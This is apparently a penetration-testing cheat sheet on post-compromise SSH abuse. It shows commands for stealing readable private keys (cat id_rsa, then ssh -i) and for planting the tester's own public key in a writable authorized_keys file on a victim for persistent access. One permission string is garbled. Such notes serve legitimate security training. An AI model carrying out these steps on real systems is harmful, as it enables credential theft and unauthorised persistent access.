---
description: >-
  This is a crucial step in post compromise. It also allows for the
  best-case-scenario shell.
---

# 🔑 SSH Key Transfer

## Hijacking a user’s SSH Private Key via readable private keys

### How can you detect this?

```python
ls -la /home /root /etc/ssh /home/*/.ssh/; /etc/ssh:

-rwxrwxtwx 1 stef stef 565 Feb 16 01:28 id_rsa
```

* If you see the following permissions, the private keys are readable and you can then hijack them:

1. cd /.ssh
2. cat id\_rsa
3. copy/paste contents of id\_rsa into a file in a directory named after the individual’s name you are stealing the key from.
4. nano id\_rsa and paste the contents of id\_rsa into here.
5. chmod 600 id\_rsa
6.  SSH into the machine using the following syntax:

    ```python
    ssh -i id_rsa <user>@<IP>
    ```

## Writable Public Keys:

* If the authorized\_keys file is writable to the current user, this can be exploited by adding additional authorized keys.

### How can you detect this?

```python
ls -la /home /root /etc/ssh /home/*/.ssh/; /etc/ssh:
-rwxrwxrwx 1 stef stef 565 Feb 16 01:58 authorized_keys
```

* The easiest way to exploit this is to generate a new SSH key pair, add the public key to the file and login using the private key.

#### Generate a new SSH key pair:

```python
# On kali:
ssh-keygen

cat ~/.ssh/id_rsa.pub

cat ~/.ssh/id_rsa.pub | xclip -selection c
```

Copy the public key to the host:

```python
# On victim:
echo "ssh-rsa <pub_key_here>= kali@kali" >> /home/user/.ssh/authorized_keys

cat /home/user/.ssh/authorized_keys
```

Connect to the victim via SSH:

```python
ssh user@<IP>
```

* Note that if the key pair was not generated in the default directory for SSH, the private key can be specified using -i.

## References

[https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/)
